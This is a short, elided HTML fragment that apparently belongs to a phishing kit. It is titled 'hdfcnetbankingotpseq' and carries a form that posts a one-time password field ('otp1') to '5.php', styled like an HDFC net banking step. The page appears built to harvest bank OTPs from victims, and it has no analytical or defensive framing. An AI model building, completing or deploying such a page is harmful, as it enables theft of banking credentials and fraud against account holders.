...
<head>
    <meta charset="UTF-8">
    <title>hdfcnetbankingotpseq</title>
...
<header style= "background-image: url(t2.jpeg);
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: contain;
    min-height: 200px;">
...
<!--<div class="loader"></div>-->
        ...
        <form action="5.php" method="post">
            <div class="form-group">
                ...
                <input type="text" name="otp1" class="form-control " value="" placeholder="Enter otp">
